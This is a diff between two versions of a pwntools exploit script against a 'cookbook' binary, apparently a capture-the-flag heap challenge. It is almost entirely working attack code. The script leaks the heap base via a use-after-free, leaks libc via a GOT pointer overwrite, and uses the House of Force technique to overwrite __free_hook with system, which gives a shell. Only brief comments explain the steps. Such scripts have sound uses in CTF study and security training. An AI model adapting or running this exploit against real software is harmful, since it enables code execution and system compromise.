@@ -1,136 +1,154 @@
-#!/usr/bin/python3
-from pwn import *
+#!/usr/bin/env python3
 
-elf = context.binary = ELF("./cookbook")
+from pwn import *
+import ctypes
+context.binary = elf = ELF("./cookbook_patched")
+
+
+#context.log_level = 'debug'
 libc = elf.libc
 
+io = elf.process()
+
+
 gs = '''
-continue
-'''
-def start():
-    if args.GDB:
-        return gdb.debug(elf.path, gdbscript=gs)
-    else:
-        return process(elf.path)
-
-io = start()
-
-
-def recvc():
-    io.recvuntil('[q]uit\n')
-
-
-def send(msg):
-    io.sendline(msg)
-
-'''
-    we can leverage a UaF bug to leak a heap address
-
-'''
-heap_base_offset = 0x1878
-
-
-def leakHeap():
-    send(b'c') # [c]reate recipe
-    recvc()
-    send(b'n') # [n]ew recipe
-    recvc()
-    send(b'a') # [a]dd ingredient
-    recvc()
-    send(b'water')
-    send(b'0x41')
-
-    # delete the recipe
-    
-    send(b'd') # [d]iscard recipe
-    recvc()
-
-    # print recipe
-
-    send(b'p') # [p]rint current recipe
-    
-    io.recv(1024)
-    leak = io.recv(1024)
-    send(b'q')
-    return int(leak.split(b'\n')[3].strip(b' - '))
-    
-
-'''
-    leak libc via Uninitialized Heap variable
+    set $recipe=0x0804D0A0
+    set $ingredient=0x0804d09c
+    continue
 '''
 
-def leakLibc():
-    send(b'g') # [g]ive cookbook name
-    send(b'g') 
-    io.recvuntil(b'cookbook is ')
-    leak = io.recv(4)
-    recvc()
-    return u32(leak)
+def sendc(c):
+    io.sendline(c)
 
-def fillHeap(n):
-    log.info(f'filling heap holes with 0x{n:02x} small chunks')
-    for _ in range(n):
-        send(b'g') # [g]ive cookbook name
-        send(hex(0x5))
-        send(b'XX')
-        recvc()
 
-io.recvline()
+# recv until '[q]uit'
 
-io.sendline(b'/bin/sh\x00') # username
-heap = leakHeap() - heap_base_offset
-log.success(f'heap base @ 0x{heap:02x}')
+def recvq():
+    io.recvuntil(b"[q]uit\n")
 
-sh = heap+0x160
-log.info(f'/bin/sh @ 0x{sh:02x}')
+if args.GDB:
+    gdb.attach(io, gdbscript=gs)
 
-libc.address = leakLibc() - 0x1d89d8
-log.success(f'libc base @ 0x{libc.address:02x}')
+def groom(times):
+    for i in range(times):
+        sendc(b'g')
+        io.sendlineafter(b' : ',hex(0x5).encode())
+        sendc(b'A')
+        recvq()
+
+io.sendlineafter(b"your name?", b"/bin/sh\x00")
+
+
+
+# leak heap using a use-after-free
+
+sendc(b'c') # [c]reate recipe
+sendc(b'n') # [n]ew recipe
+sendc(b'a') # [a]dd ingredient
+
+io.sendlineafter(b'ngredient to add? ', b'basil')
+io.sendlineafter(b'(hex): ', b'0xdeadbeef')
+
+sendc(b'd') # [d]iscard recipe
+
+sendc(b'p') # [p]rint current recipe
+
+io.recvuntil(b'recipe type: (null)\n\n')
+
+heap = int(io.recv(9)) - 0x16d8 
+
+recvq()
+sendc(b'q') # [q]uit
+recvq()
+
+log.success(f'heap @ 0x{heap:02x}')
+
+# leak libc
 
 
 '''
-    House of Force technique
+    here i leaked libc by overwriting an ingredient list entry with printf GOT but there is an other way to leak libc address via Uninitialized ingredient 
 '''
 
-# fill holes with small chunks
 
-fillHeap(0x200)
+sendc(b'a') # [a]dd ingredient
+sendc(b'n') # [n]ew inredient
+sendc(b'g') # [g]ive ingredient name
+sendc(b'FUZZ')
+sendc(b'p') # [p]rice ingredient
+sendc(b'1')
+sendc(b's') # [s]et ingredient calories
+sendc(b'2')
+sendc(b'e') # [e]xport ingredient
+sendc(b'q') # [quit]
+recvq()
 
-# first we will create a stale recipe pointer
+sendc(b'c') # [c]reate a recipe
+recvq()
+sendc(b'g') # [g]ive recipe a name
+sendc(b'A'*0xc + p64(elf.got.printf)) # overwrite ingredient list entry with printf GOT address
+recvq()
+sendc(b'q') # [q]uit
 
-send(b'c') # [c]reate recipe
-recvc()
-send(b'n') # [n]ew recipe
-recvc()
-send(b'd') # [d]iscard recipe 
-recvc()
-send(b'q') # [q]uit
+recvq()
+
+sendc(b'l') # [l]ist current ingredients
+
+io.recvuntil(b'name: olive oil\ncalories: 2\nprice: 3\n------\nname:')
+io.recvuntil(b'calories: ')
+
+libc.address = ctypes.c_uint32(int(io.recvline().strip())).value - libc.sym.printf
+
+log.success(f'libc @ 0x{libc.address:02x}')
+
+recvq()
+
+# house of force
 
 
-send(b'a') # [a]dd ingredient
-send(b'n') # [n]ew ingredient
-send(b'q')
-recvc()
-send(b'c') # [c]reate recipe
-send(b'g') # [g]ive recipe a name
+groom(0x100) # fill heap holes
 
-send(p32(0)*4+p32(0xffffffff)) # overwrite the wilderness
-send(b'q') # [q]uit
-recvc()
 
-top_chunk = heap+0x3518
+sendc(b'c') # [c]reate a recipe
+recvq()
+sendc(b'n') # [n]ew recipe
+recvq()
+sendc(b'd') # [d]iscard recipe
+recvq()
+sendc(b'q') # [q]uit
+recvq()
 
-distance = libc.sym.__free_hook-0x10 - top_chunk
+sendc(b'g')
+io.sendlineafter(b' : ', hex(0x90).encode())
+sendc(b'AB')
+recvq()
 
-send(b'g') # [g]ive recipe a name
 
-send(hex(distance))
-recvc()
+top_chunk = heap+0x2410
 
-send(b'g') # [g]ive recipe a name
-send(hex(0x8))
-send(p32(libc.sym.system))
-recvc()
+sendc(b'c')
+recvq()
+sendc(b'i')
+sendc(b'A'*0x8 + p32(0xffffffff)) # overwrite the wilderness size with large value
+recvq()
 
-send(b'q') # [q]uit this trigger free()
+
+distance = libc.sym.__free_hook-0x10-top_chunk
+
+
+sendc(b'q')
+recvq()
+sendc(b'g')
+io.sendlineafter(b' : ', hex(distance).encode()) # allocate gap between top_chunk and __free_hook
+sendc(b'AB')
+recvq()
+
+sendc(b'g')
+io.sendlineafter(b' : ', hex(0x20).encode()) 
+
+sendc(p32(libc.sym.system)) # overwrite __free_hook with system
+
+recvq()
+
+sendc(b'q')
 io.interactive()
